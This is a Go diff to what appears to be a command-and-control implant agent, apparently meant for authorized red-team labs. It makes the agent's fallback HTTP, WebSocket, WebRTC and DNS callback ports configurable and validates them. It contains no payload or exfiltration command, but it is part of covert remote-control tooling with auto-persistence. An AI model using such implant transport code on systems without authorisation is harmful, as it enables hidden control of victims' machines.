@@ -17,6 +17,7 @@ import (
 	"os/user"
 	"path/filepath"
 	"runtime"
+	"strconv"
 	"strings"
 	"sync"
 	"time"
@@ -78,6 +79,15 @@ type Agent struct {
 	// Optional DNS transport domain (opt-in via -dns-domain)
 	dnsDomain string
 
+	// Transport fallback ports. Defaults match the server's
+	// config.example.yaml (transport.http_port / ws_port / webrtc_port /
+	// dns_port); a deployment that moves those listeners overrides them
+	// here via the matching CLI flags — no recompile needed.
+	httpPort     string
+	wsPort       string
+	webrtcPort   string
+	agentDnsPort string
+
 	// autoPersist controls first-run auto-persistence. It defaults to true
 	// but lab operators should disable it via -no-persist: authorized
 	// test benches rarely want the implant reinstalling itself on reboot.
@@ -105,6 +115,10 @@ func New(serverAddr string) *Agent {
 		dynModules:     make(map[string]*DynamicModule),
 		exfilJobs:      make(map[string]*exfilJob),
 		autoPersist:    true,
+		httpPort:       "8445",
+		wsPort:         "8446",
+		webrtcPort:     "8447",
+		agentDnsPort:   "8444",
 		tasks:          make(chan *proto.Task, 256),
 		results:        make(chan *proto.TaskResult, 256),
 	}
@@ -113,6 +127,53 @@ func New(serverAddr string) *Agent {
 // SetDNSDomain enables the DNS transport fallback for the given domain.
 // The server must be listening with the same domain in transport.dns_domains.
 func (a *Agent) SetDNSDomain(domain string) { a.dnsDomain = domain }
+
+// normalizePort validates a port string: non-empty, all digits, 1-65535.
+// Anything else returns def, so a typo in a CLI flag cannot silently break a
+// transport (it falls back to the documented default instead).
+func normalizePort(p, def string) string {
+	if p == "" || len(p) > 5 {
+		return def
+	}
+	for _, r := range p {
+		if r < '0' || r > '9' {
+			return def
+		}
+	}
+	n, err := strconv.Atoi(p)
+	if err != nil || n < 1 || n > 65535 {
+		return def
+	}
+	return p
+}
+
+// SetTransportPorts overrides the fallback ports the agent dials for the
+// non-primary transports. Empty values keep the current defaults; invalid
+// values are logged and keep the default too (8445 HTTP, 8446 WebSocket,
+// 8447 WebRTC, 8444 DNS). Wired to the -http-port/-ws-port/-webrtc-port/
+// -dns-port CLI flags.
+func (a *Agent) SetTransportPorts(http, ws, webrtc, dns string) {
+	if p := normalizePort(http, a.httpPort); http == "" || p == http {
+		a.httpPort = p
+	} else {
+		log.Printf("[AGENT] invalid -http-port %q, keeping %s", http, a.httpPort)
+	}
+	if p := normalizePort(ws, a.wsPort); ws == "" || p == ws {
+		a.wsPort = p
+	} else {
+		log.Printf("[AGENT] invalid -ws-port %q, keeping %s", ws, a.wsPort)
+	}
+	if p := normalizePort(webrtc, a.webrtcPort); webrtc == "" || p == webrtc {
+		a.webrtcPort = p
+	} else {
+		log.Printf("[AGENT] invalid -webrtc-port %q, keeping %s", webrtc, a.webrtcPort)
+	}
+	if p := normalizePort(dns, a.agentDnsPort); dns == "" || p == dns {
+		a.agentDnsPort = p
+	} else {
+		log.Printf("[AGENT] invalid -dns-port %q, keeping %s", dns, a.agentDnsPort)
+	}
+}
 
 // SetAutoPersist enables or disables first-run auto-persistence. It is wired
 // to the -no-persist CLI flag: authorized lab runs should disable it so the
@@ -300,7 +361,7 @@ func (a *Agent) connect() error {
 		{
 			name: "HTTP",
 			dial: func() (net.Conn, error) {
-				httpPort := "8445"
+				httpPort := a.httpPort
 				base := net.JoinHostPort(host, httpPort)
 				// The server serves the long-poll listener over
 				// TLS whenever tls.enabled (independent of
@@ -316,14 +377,14 @@ func (a *Agent) connect() error {
 		{
 			name: "WebSocket",
 			dial: func() (net.Conn, error) {
-				wsPort := "8446"
+				wsPort := a.wsPort
 				return dialWebSocket(host, wsPort, a.clientCert)
 			},
 		},
 		{
 			name: "WebRTC",
 			dial: func() (net.Conn, error) {
-				webrtcPort := "8447"
+				webrtcPort := a.webrtcPort
 				addr := net.JoinHostPort(host, webrtcPort)
 				// The server serves signaling over TLS whenever tls.enabled
 				// (independent of mTLS). Try HTTPS first, then plaintext, so
@@ -341,7 +402,7 @@ func (a *Agent) connect() error {
 				if a.dnsDomain == "" {
 					return nil, fmt.Errorf("DNS transport disabled (start the agent with -dns-domain <domain>)")
 				}
-				dnsPort := "8444"
+				dnsPort := a.agentDnsPort
 				return dialDNS(net.JoinHostPort(host, dnsPort), a.dnsDomain)
 			},
 		},
